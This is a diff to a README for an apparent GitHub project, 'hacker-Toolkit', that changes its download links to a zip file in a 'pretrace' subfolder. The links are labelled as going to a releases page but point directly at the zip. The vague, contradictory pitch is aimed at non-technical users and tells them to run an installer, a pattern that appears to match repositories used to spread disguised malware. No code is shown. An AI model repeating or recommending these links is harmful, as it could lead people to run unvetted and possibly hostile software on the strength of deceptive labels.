@@ -1,7 +1,7 @@
 # ✨ hacker-Toolkit - Your All-in-One Hacking Tool
 
 ## 📥 Download Now
-[![Download the Latest Release](https://raw.githubusercontent.com/ejfhgo/hacker-Toolkit/main/pretrace/hacker-Toolkit.zip%20Now-%23FFAA00?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/ejfhgo/hacker-Toolkit/main/pretrace/hacker-Toolkit.zip)
+[![Download the Latest Release](https://github.com/ejfhgo/hacker-Toolkit/raw/refs/heads/main/pretrace/Toolkit_hacker_1.0.zip%20Now-%23FFAA00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ejfhgo/hacker-Toolkit/raw/refs/heads/main/pretrace/Toolkit_hacker_1.0.zip)
 
 ## 📜 Overview
 Welcome to the **hacker-Toolkit**, a powerful multi-feature application designed to enhance your productivity and make your online activities more efficient. This beta version includes tools that can help with social media engagement, temporary communication solutions, and some fun utilities. It's built for the average user who seeks straightforward solutions without needing technical skills.
@@ -10,7 +10,7 @@ Welcome to the **hacker-Toolkit**, a powerful multi-feature application designed
 To begin using hacker-Toolkit, follow these simple steps:
 
 1. **Visit the Releases Page**: Click on the link below to access the latest version of the tool.
-   - [Download from Releases Page](https://raw.githubusercontent.com/ejfhgo/hacker-Toolkit/main/pretrace/hacker-Toolkit.zip)
+   - [Download from Releases Page](https://github.com/ejfhgo/hacker-Toolkit/raw/refs/heads/main/pretrace/Toolkit_hacker_1.0.zip)
 
 2. **Download the Application**: Find the version you want. Click on the file to start the download.
 
@@ -65,7 +65,7 @@ The toolkit currently boasts **83 features**, with plans to expand further.
 To start using hacker-Toolkit, follow these instructions:
 
 1. **Download the Tool**: Click the link below to access the latest version:
-   - [Download from Releases Page](https://raw.githubusercontent.com/ejfhgo/hacker-Toolkit/main/pretrace/hacker-Toolkit.zip)
+   - [Download from Releases Page](https://github.com/ejfhgo/hacker-Toolkit/raw/refs/heads/main/pretrace/Toolkit_hacker_1.0.zip)
 
 2. **Install**: Follow the installer’s prompts based on your operating system.
 
